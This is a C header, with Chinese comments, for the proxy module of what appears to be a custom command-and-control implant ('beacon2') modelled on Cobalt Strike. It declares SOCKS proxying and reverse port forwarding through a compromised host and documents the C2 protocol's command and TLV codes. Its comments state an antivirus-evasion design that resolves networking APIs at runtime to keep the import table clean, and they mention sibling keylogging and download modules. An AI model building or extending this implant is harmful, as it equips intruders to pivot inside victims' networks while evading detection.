/*
 * csdev :: beacon2_proxy.h  --  植入体侧 SOCKS 代理转发 + 反向端口转发 (rportfwd)
 * ==========================================================================
 * 对标 Cobalt Strike 的 socks / rportfwd。
 *
 * 免杀硬约束: ws2_32 全部运行期解析 (LoadLibraryA + GetProcAddress),
 *             静态导入表不新增任何条目。
 *
 * 驱动模型: 与 pump_keylog / pump_download 完全一致 —— 由宿主 (beacon2.c)
 *           主循环每轮调用一次 proxy_pump(), 本模块自身不创建线程,
 *           因此不存在与 outbox / g_meta / 下载状态机的并发竞争。
 *
 * 数据面  : 代理数据走 TLV 0x1004 (T_PROXY_DATA), 宿主经 sink 注入上行 outbox。
 * 控制面  : 通道打开 / 关闭走任务 CMD_PROXY(0x0B) 与 CMD_RPORTFWD(0x13)。
 *
 * 与 docs/protocol_v2.md 的对应关系:
 *   4.1  0x0B PROXY    arg = [4B chan_id][1B op][op 相关]
 *                       op 1=open (其后 [2B host_len][host][2B port], 网络序)
 *                       op 2=data
 *                       op 3=close
 *   4.1  0x13 RPORTFWD arg = [1B op][2B bind][2B target]
 *                       op 1=start, op 0=stop
 *   3.1  0x1004 PROXY_DATA  data = [4B chan_id][bytes]
 *   3.2  0x2003 PROXY_DATA  data = [4B chan_id][bytes]
 *
 * 通道号分配约定 (两侧必须一致, 否则 chan_id 会碰撞):
 *   服务端发起 (SOCKS 入站连接) : 0x0001 .. 0x7FFF   (bit15 = 0)
 *   植入体发起 (rportfwd 入站)  : 0x8000 .. 0xBFFF   (bit15 = 1)
 * ==========================================================================
 */
#ifndef CSDEV_BEACON2_PROXY_H
#define CSDEV_BEACON2_PROXY_H

/* ---------------------------------------------------------------- 容量上限 */

#define PROXY_MAX_CHAN      32          /* 同时打开的代理通道上限 */
#define PROXY_MAX_RPORTFWD   8          /* 同时监听的端口转发上限 */

/* ------------------------------------------------------- 上行 TLV 类型 */

#ifndef T_PROXY_DATA
#define T_PROXY_DATA   0x1004
#endif

/* 通道号半区 (见文件头说明) */
#define PROXY_CHAN_LOCAL_BASE   0x8000u
#define PROXY_CHAN_LOCAL_MAX    0xBFFFu
#define PROXY_CHAN_VALID_HI     0x8000u  /* >= 该值 = 植入体本地发起 */

/* CMD_PROXY.op */
#define PROXY_OP_OPEN   1
#define PROXY_OP_DATA   2
#define PROXY_OP_CLOSE  3

/* ------------------------------------------------------------- 宿主注入 */

/*
 * sink: "向宿主上行 outbox 追加一条 TLV"。
 *   返回值 0 = 成功; 非 0 = 失败 (通常是 outbox 已满), 调用方须保留数据下轮重试。
 *   由 beacon2.c 实现并注入; 未注入时本模块所有发送路径静默跳过 (仅收不发)。
 */
void proxy_set_sink(int (*sink)(unsigned short type,
                               const unsigned char *data, unsigned int len));

/* 供宿主判断是否已注入 sink (未注入时无需调用 proxy_pump) */
int proxy_ready(void);

/* --------------------------------------------------------------- 周期驱动 */

/*
 * 每轮 beacon 调用一次:
 *   1) 把各通道待发数据经 sink 写入上行 outbox (T_PROXY_DATA)
 *   2) 从已连接 socket 收数据并同样上行
 *   3) 推进 rportfwd 监听 socket 的 accept
 *   4) 回收已关闭 / 超时的通道
 * 内部对每次 socket 操作使用非阻塞 + select 短超时, 有活时最多自旋约 1 秒,
 * 无活时立即返回 —— 不会把 beacon 主循环卡死。
 */
void proxy_pump(void);

/* ------------------------------------------------------------- 任务处理 */

/*
 * 处理 CMD_PROXY(0x0B) 任务。
 * arg = [4B chan_id][1B op][op 相关], arglen 为任务 arg 长度。
 * 返回写入 out 的文本长度 (供宿主封装成 RESULT)。失败时写入以 "[-] " 开头的说明。
 * 注意: op=2(data) 正常路径返回 0 —— 每个数据包都回一条 RESULT 会淹没操作台。
 */
unsigned int proxy_task(const unsigned char *arg, unsigned int arglen,
                        char *out, unsigned int outcap);

/*
 * 处理 CMD_RPORTFWD(0x13) 任务。
 * arg = [1B op][2B bind][2B target], op 1=start / 0=stop。
 * 返回写入 out 的文本长度。
 */
unsigned int rportfwd_task(const unsigned char *arg, unsigned int arglen,
                           char *out, unsigned int outcap);

/* -------------------------------------------------------------- 运行状态 */

/* 当前打开的代理通道数 */
unsigned int proxy_chan_count(void);

/* 当前监听的 rportfwd 端口数 */
unsigned int proxy_rportfwd_count(void);

/* 关闭全部通道与监听 (会话结束时调用可选项) */
void proxy_shutdown(void);

#endif /* CSDEV_BEACON2_PROXY_H */
